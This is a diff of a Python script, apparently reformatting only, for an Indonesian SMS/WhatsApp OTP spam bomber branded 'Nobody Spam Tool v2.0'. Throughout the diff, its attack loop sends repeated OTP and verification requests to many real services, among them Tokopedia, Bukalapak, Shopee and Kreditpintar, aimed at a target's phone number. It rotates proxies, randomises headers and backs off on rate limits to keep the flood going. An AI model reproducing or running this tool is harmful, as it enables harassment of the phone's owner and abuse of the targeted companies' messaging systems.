@@ -1,3 +1,4 @@
+#!/usr/local/bin/.venv/bin/python
 #!/usr/bin/env python3
 
 
@@ -28,7 +29,8 @@ def _check_aiohttp():
     except ImportError:
         print(f"\n\033[93m[!] aiohttp belum terinstall.\033[0m")
         print(f"\033[96m[*] Mencoba install otomatis...\033[0m")
-        ret = os.system(f"{sys.executable} -m pip install aiohttp --quiet --disable-pip-version-check")
+        ret = os.system(
+            f"{sys.executable} -m pip install aiohttp --quiet --disable-pip-version-check")
         if ret == 0:
             try:
                 import aiohttp
@@ -37,8 +39,10 @@ def _check_aiohttp():
             except ImportError:
                 pass
         # Second attempt — try with --no-build-isolation for Termux
-        print(f"\033[93m[*] Coba install dengan --no-build-isolation (Termux)...\033[0m")
-        ret = os.system(f"{sys.executable} -m pip install aiohttp --no-build-isolation --quiet")
+        print(
+            f"\033[93m[*] Coba install dengan --no-build-isolation (Termux)...\033[0m")
+        ret = os.system(
+            f"{sys.executable} -m pip install aiohttp --no-build-isolation --quiet")
         if ret == 0:
             try:
                 import aiohttp
@@ -51,11 +55,13 @@ def _check_aiohttp():
         print(f"\033[97m    # atau: MATHLAPACK=0 pip install aiohttp\033[0m")
         sys.exit(1)
 
+
 aiohttp = _check_aiohttp()
 
 # ═══════════════════════════════════════════════════════════
 #  CONFIGURATION
 # ═══════════════════════════════════════════════════════════
+
 
 @dataclass
 class Config:
@@ -77,21 +83,22 @@ class Config:
     max_phone_digits: int = 15
     min_phone_digits: int = 9
 
+
 CFG = Config()
 
 # ═══════════════════════════════════════════════════════════
 #  COLOURS — Professional Palette
 # ═══════════════════════════════════════════════════════════
 
-TEAL    = '\033[38;5;36m'
-GRAY    = '\033[38;5;245m'
-HIJAU   = '\033[92m'
-MERAH   = '\033[91m'
-CYAN    = '\033[96m'
-PUTIH   = '\033[97m'
-RESET   = '\033[0m'
-BOLD    = '\033[1m'
-DIM     = '\033[2m'
+TEAL = '\033[38;5;36m'
+GRAY = '\033[38;5;245m'
+HIJAU = '\033[92m'
+MERAH = '\033[91m'
+CYAN = '\033[96m'
+PUTIH = '\033[97m'
+RESET = '\033[0m'
+BOLD = '\033[1m'
+DIM = '\033[2m'
 
 # ═══════════════════════════════════════════════════════════
 #  LOGGING
@@ -107,7 +114,8 @@ logger = logging.getLogger('WEAIIN')
 
 _stderr_h = logging.StreamHandler(sys.stderr)
 _stderr_h.setLevel(logging.WARNING)
-_stderr_h.setFormatter(logging.Formatter('%(asctime)s [%(levelname)s] %(message)s'))
+_stderr_h.setFormatter(logging.Formatter(
+    '%(asctime)s [%(levelname)s] %(message)s'))
 logger.addHandler(_stderr_h)
 
 # ═══════════════════════════════════════════════════════════
@@ -147,6 +155,7 @@ LANG_VARIANTS = [
 # ═══════════════════════════════════════════════════════════
 #  HELPERS
 # ═══════════════════════════════════════════════════════════
+
 
 def normalize_phone(raw: str) -> dict:
     digits = ''.join(c for c in raw if c.isdigit())
@@ -268,7 +277,8 @@ class Stats:
     async def record(self, api_name: str, status: Optional[int], elapsed_ms: float):
         async with self._lock:
             if api_name not in self._data:
-                self._data[api_name] = {'ok': 0, 'fail': 0, 'last': None, 'ms': 0.0, 'hits': 0}
+                self._data[api_name] = {
+                    'ok': 0, 'fail': 0, 'last': None, 'ms': 0.0, 'hits': 0}
             d = self._data[api_name]
             d['hits'] += 1
             d['ms'] += elapsed_ms
@@ -297,10 +307,12 @@ class Stats:
                 total_fail += d['fail']
                 total_hits += d['hits']
             lines.append(f"  {'─' * 55}")
-            lines.append(f"  {'TOTAL':<26} {total_ok:>5} {total_fail:>5} {total_hits:>5}")
+            lines.append(
+                f"  {'TOTAL':<26} {total_ok:>5} {total_fail:>5} {total_hits:>5}")
             rate = (total_ok / total_hits * 100) if total_hits else 0
             lines.append(f"  {HIJAU}Success Rate: {rate:.1f}%{RESET}")
-            lines.append(f"{CYAN}══════════════════════════════════════════════{RESET}\n")
+            lines.append(
+                f"{CYAN}══════════════════════════════════════════════{RESET}\n")
             return '\n'.join(lines)
 
 
@@ -310,12 +322,15 @@ class Stats:
 
 SHUTDOWN = asyncio.Event()
 
+
 def _signal_handler(sig, frame):
     logger.info(f"Signal {sig} received — shutting down.")
     SHUTDOWN.set()
 
+
 # ─── Rate‑limit per API ───
 _api_last_call: dict = {}
+
 
 async def rate_limit_wait(api_name: str):
     last = _api_last_call.get(api_name, 0.0)
@@ -356,8 +371,10 @@ async def safe_request(
 
                 # 429 Too Many Requests → backoff + retry
                 if status == 429 and attempt < CFG.retry_count:
-                    wait = CFG.retry_backoff_base ** attempt + random.uniform(0.3, 1.0)
-                    logger.warning(f"{api_name} 429 — retry in {wait:.1f}s (attempt {attempt})")
+                    wait = CFG.retry_backoff_base ** attempt + \
+                        random.uniform(0.3, 1.0)
+                    logger.warning(
+                        f"{api_name} 429 — retry in {wait:.1f}s (attempt {attempt})")
                     await asyncio.sleep(wait)
                     continue
 
@@ -365,19 +382,23 @@ async def safe_request(
 
         except asyncio.TimeoutError:
             elapsed = (time.monotonic() - t0) * 1000
-            logger.warning(f"{api_name} TIMEOUT (attempt {attempt}/{CFG.retry_count})")
+            logger.warning(
+                f"{api_name} TIMEOUT (attempt {attempt}/{CFG.retry_count})")
 
         except aiohttp.ClientError as e:
             elapsed = (time.monotonic() - t0) * 1000
-            logger.error(f"{api_name} ClientError attempt {attempt}: {type(e).__name__}: {e}")
+            logger.error(
+                f"{api_name} ClientError attempt {attempt}: {type(e).__name__}: {e}")
 
         except OSError as e:
             elapsed = (time.monotonic() - t0) * 1000
-            logger.error(f"{api_name} OSError attempt {attempt}: {type(e).__name__}: {e}")
+            logger.error(
+                f"{api_name} OSError attempt {attempt}: {type(e).__name__}: {e}")
 
         except Exception as e:
             elapsed = (time.monotonic() - t0) * 1000
-            logger.error(f"{api_name} UNEXPECTED attempt {attempt}: {type(e).__name__}: {e}")
+            logger.error(
+                f"{api_name} UNEXPECTED attempt {attempt}: {type(e).__name__}: {e}")
             logger.debug(traceback.format_exc())
 
         # Backoff before next attempt
@@ -396,10 +417,12 @@ async def api_bonusbelanja(session, phone: dict, proxy) -> tuple:
     name = "Bonusbelanja"
     url = "https://www.bonusbelanja.com/api/auth/registration/app"
     headers = random_headers({"Content-Type": "application/json"})
-    payload = {"agreeContact": True, "agreeTnc": True, "name": "Ucup", "phone": phone['with_62']}
+    payload = {"agreeContact": True, "agreeTnc": True,
+               "name": "Ucup", "phone": phone['with_62']}
     status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, json=payload)
     await stats.record(name, status, ms)
     return name, status
+
 
 async def api_bunda(session, phone: dict, proxy) -> tuple:
     name = "Bunda"
@@ -409,6 +432,7 @@ async def api_bunda(session, phone: dict, proxy) -> tuple:
     status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, json=payload)
     await stats.record(name, status, ms)
     return name, status
+
 
 async def api_duniagames(session, phone: dict, proxy) -> tuple:
     name = "Duniagames"
@@ -423,6 +447,7 @@ async def api_duniagames(session, phone: dict, proxy) -> tuple:
     await stats.record(name, status, ms)
     return name, status
 
+
 async def api_viuum(session, phone: dict, proxy) -> tuple:
     name = "Viuum"
     url = "https://api.viuum.co.id/api_viuum/v1/customer/one-time"
@@ -435,10 +460,12 @@ async def api_viuum(session, phone: dict, proxy) -> tuple:
     await stats.record(name, status, ms)
     return name, status
 
+
 async def api_mengantar(session, phone: dict, proxy) -> tuple:
     name = "Mengantar"
     url = "https://app.mengantar.com/api/auth/send-verification-code"
-    headers = random_headers({"Content-Type": "application/json;charset=UTF-8"})
+    headers = random_headers(
+        {"Content-Type": "application/json;charset=UTF-8"})
     payload = {
         "courier": "JNE",
         "email": "mamangucup@gmail.com",
@@ -452,14 +479,17 @@ async def api_mengantar(session, phone: dict, proxy) -> tuple:
     await stats.record(name, status, ms)
     return name, status
 
+
 async def api_paperid(session, phone: dict, proxy) -> tuple:
     name = "PaperId"
     url = "https://register.paper.id/api/v1/auth/register/send-otp"
     headers = random_headers({"Content-Type": "application/json"})
-    payload = {"method": "whatsapp", "phone": phone['with_62'], "registered_by": "web"}
+    payload = {"method": "whatsapp",
+               "phone": phone['with_62'], "registered_by": "web"}
     status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, json=payload)
     await stats.record(name, status, ms)
     return name, status
+
 
 async def api_rumah123(session, phone: dict, proxy) -> tuple:
     name = "Rumah123"
@@ -479,6 +509,7 @@ async def api_rumah123(session, phone: dict, proxy) -> tuple:
     await stats.record(name, status, ms)
     return name, status
 
+
 async def api_planetban(session, phone: dict, proxy) -> tuple:
     name = "Planetban"
     url = "https://api.planetban.com/website/customer/request-otp"
@@ -487,10 +518,12 @@ async def api_planetban(session, phone: dict, proxy) -> tuple:
         "Origin": "https://planetban.com",
         "Referer": "https://planetban.com/",
     })
-    payload = {"phone": phone['with_0'], "purpose": "register", "method": "whatsapp"}
+    payload = {"phone": phone['with_0'],
+               "purpose": "register", "method": "whatsapp"}
     status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, json=payload)
     await stats.record(name, status, ms)
     return name, status
+
 
 async def api_uangme(session, phone: dict, proxy) -> tuple:
     name = "Uangme"
@@ -501,10 +534,12 @@ async def api_uangme(session, phone: dict, proxy) -> tuple:
         "Lan": "id-ID",
         "Referer": "https://h5.uangme.id/",
     })
-    params = {"send_type": "sms", "phone": phone['local8'], "scene_type": "login"}
+    params = {"send_type": "sms",
+              "phone": phone['local8'], "scene_type": "login"}
     status, ms = await safe_request(session, 'GET', url, proxy, api_name=name, headers=headers, params=params)
     await stats.record(name, status, ms)
     return name, status
+
 
 async def api_speedcash(session, phone: dict, proxy) -> tuple:
     name = "Speedcash"
@@ -532,6 +567,7 @@ async def api_speedcash(session, phone: dict, proxy) -> tuple:
     await stats.record(name, status, ms)
     return name, status
 
+
 async def api_toyota(session, phone: dict, proxy) -> tuple:
     name = "Toyota"
     url = "https://data-web.tam-icm.com/api/public/vendors/tokenize"
@@ -547,6 +583,7 @@ async def api_toyota(session, phone: dict, proxy) -> tuple:
     await stats.record(name, status, ms)
     return name, status
 
+
 async def api_kreditpintar(session, phone: dict, proxy) -> tuple:
     name = "Kreditpintar"
     url = "https://go.kreditpintar.com/api/auth/send-code"
@@ -560,6 +597,7 @@ async def api_kreditpintar(session, phone: dict, proxy) -> tuple:
     status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, params=params, json=payload)
     await stats.record(name, status, ms)
     return name, status
+
 
 async def api_astradaihatsu(session, phone: dict, proxy) -> tuple:
     name = "AstraDaihatsu"
@@ -578,6 +616,7 @@ async def api_astradaihatsu(session, phone: dict, proxy) -> tuple:
     status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, data=payload)
     await stats.record(name, status, ms)
     return name, status
+
 
 async def api_pinhome(session, phone: dict, proxy) -> tuple:
     name = "Pinhome"
@@ -602,6 +641,7 @@ async def api_pinhome(session, phone: dict, proxy) -> tuple:
     await stats.record(name, status, ms)
     return name, status
 
+
 async def api_tokopedia(session, phone: dict, proxy) -> tuple:
     name = "Tokopedia"
     url = "https://accounts.tokopedia.com/otp/c/page"
@@ -619,6 +659,7 @@ async def api_tokopedia(session, phone: dict, proxy) -> tuple:
     await stats.record(name, status, ms)
     return name, status
 
+
 async def api_bukalapak(session, phone: dict, proxy) -> tuple:
     name = "Bukalapak"
     url = "https://accounts.bukalapak.com/phone_number/verifications"
@@ -631,6 +672,7 @@ async def api_bukalapak(session, phone: dict, proxy) -> tuple:
     status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, json=payload)
     await stats.record(name, status, ms)
     return name, status
+
 
 async def api_shopee(session, phone: dict, proxy) -> tuple:
     name = "Shopee"
@@ -678,13 +720,15 @@ API_FUNCS = [
 # global stats instance (set in main)
 stats: Stats = Stats()
 
+
 async def attack_loop(target_raw: str, proxy_mgr: ProxyManager):
     """Main attack loop."""
     global stats
     stats = Stats()
 
     phone = normalize_phone(target_raw)
-    connector = aiohttp.TCPConnector(limit=CFG.tcp_limit, force_close=False, enable_cleanup_closed=True)
+    connector = aiohttp.TCPConnector(
+        limit=CFG.tcp_limit, force_close=False, enable_cleanup_closed=True)
     timeout_cfg = aiohttp.ClientTimeout(total=CFG.request_timeout)
 
     async with aiohttp.ClientSession(connector=connector, timeout=timeout_cfg) as session:
@@ -697,7 +741,8 @@ async def attack_loop(target_raw: str, proxy_mgr: ProxyManager):
             shuffled = random.sample(API_FUNCS, len(API_FUNCS))
 
             print(f"\n{CYAN} ╔══ LOOP {loop_count} {'═' * 38}{RESET}")
-            print(f"{CYAN} ║  Target : {PUTIH}{phone['with_0']}  {CYAN}Proxies: {PUTIH}{proxy_mgr.count}{RESET}")
+            print(
+                f"{CYAN} ║  Target : {PUTIH}{phone['with_0']}  {CYAN}Proxies: {PUTIH}{proxy_mgr.count}{RESET}")
             print(f"{CYAN} ╚{'═' * 48}{RESET}")
 
             async def _worker(fn):
@@ -734,17 +779,20 @@ async def attack_loop(target_raw: str, proxy_mgr: ProxyManager):
                 else:
                     fail += 1
                     colour = MERAH if code else DIM
-                    print(f"  {MERAH}✗{RESET} {_name:<24} {colour}{code or 'ERR'}{RESET}")
+                    print(
+                        f"  {MERAH}✗{RESET} {_name:<24} {colour}{code or 'ERR'}{RESET}")
 
             elapsed_loop = time.monotonic() - t_loop
-            print(f"\n  {HIJAU}OK: {ok}{RESET}  {MERAH}FAIL: {fail}{RESET}  {DIM}({elapsed_loop:.1f}s){RESET}")
+            print(
+                f"\n  {HIJAU}OK: {ok}{RESET}  {MERAH}FAIL: {fail}{RESET}  {DIM}({elapsed_loop:.1f}s){RESET}")
 
             if SHUTDOWN.is_set():
                 break
 
             # Non-blocking cooldown — CTRL+C works instantly
             cooldown = random.uniform(CFG.cooldown_min, CFG.cooldown_max)
-            print(f"  {TEAL}⏳ Cooldown {cooldown:.1f}s — Ctrl+C untuk berhenti{RESET}")
+            print(
+                f"  {TEAL}⏳ Cooldown {cooldown:.1f}s — Ctrl+C untuk berhenti{RESET}")
 
             try:
                 await asyncio.wait_for(SHUTDOWN.wait(), timeout=cooldown)
@@ -767,7 +815,8 @@ def load_proxies(filename: str = 'proxies.txt') -> list:
         logger.warning(f"Proxy file {filename} not found.")
         return []
     with open(path, 'r') as f:
-        raw = [line.strip() for line in f if line.strip() and not line.startswith('#')]
+        raw = [line.strip() for line in f if line.strip()
+               and not line.startswith('#')]
     seen = set()
     proxies = []
     for p in raw:
@@ -780,7 +829,8 @@ def load_proxies(filename: str = 'proxies.txt') -> list:
             proxies.append(f"http://{p}")
             logger.info(f"Auto-prefixed proxy: http://{p}")
     if proxies:
-        print(f"{HIJAU}[+] {len(proxies)} proxy dimuat dari {filename}.{RESET}")
+        print(
+            f"{HIJAU}[+] {len(proxies)} proxy dimuat dari {filename}.{RESET}")
     else:
         print(f"{MERAH}[!] Tidak ada proxy valid di {filename}.{RESET}")
     return proxies
@@ -821,7 +871,8 @@ def show_banner():
 def loading_awal():
     clear_screen()
     print(f"\n{TEAL} ╔═══════════════════════════════════════════════════════╗")
-    print(f"{TEAL} ║ {GRAY}[!] Menginisialisasi Nobody Spam Tool v2.0...      {TEAL}║")
+    print(
+        f"{TEAL} ║ {GRAY}[!] Menginisialisasi Nobody Spam Tool v2.0...      {TEAL}║")
     print(f"{TEAL} ╚═══════════════════════════════════════════════════════╝{RESET}")
     time.sleep(1)
 
@@ -837,12 +888,14 @@ def loading_awal():
         for j in range(bar_len + 1):
             pct = j / bar_len * 100
             filled = '█' * j + '░' * (bar_len - j)
-            sys.stdout.write(f"\r{TEAL}[{filled}] {pct:5.1f}% {GRAY}{step}{RESET}")
+            sys.stdout.write(
+                f"\r{TEAL}[{filled}] {pct:5.1f}% {GRAY}{step}{RESET}")
             sys.stdout.flush()
             time.sleep(0.02 + random.uniform(0, 0.02))
         print()
 
-    print(f"\n{HIJAU}[✓] Sistem siap. Kunjungi {TEAL}nobody0x.com{RESET}{HIJAU} untuk info lebih lanjut.{RESET}")
+    print(
+        f"\n{HIJAU}[✓] Sistem siap. Kunjungi {TEAL}nobody0x.com{RESET}{HIJAU} untuk info lebih lanjut.{RESET}")
     time.sleep(0.8)
 
 
@@ -919,7 +972,8 @@ def main():
             time.sleep(0.5)
 
         elif pilihan in ('0', '00'):
-            print(f"\n{HIJAU}[*] Sistem Dimatikan. Sampai jumpa di lain misi!{RESET}")
+            print(
+                f"\n{HIJAU}[*] Sistem Dimatikan. Sampai jumpa di lain misi!{RESET}")
             break
 
         else:
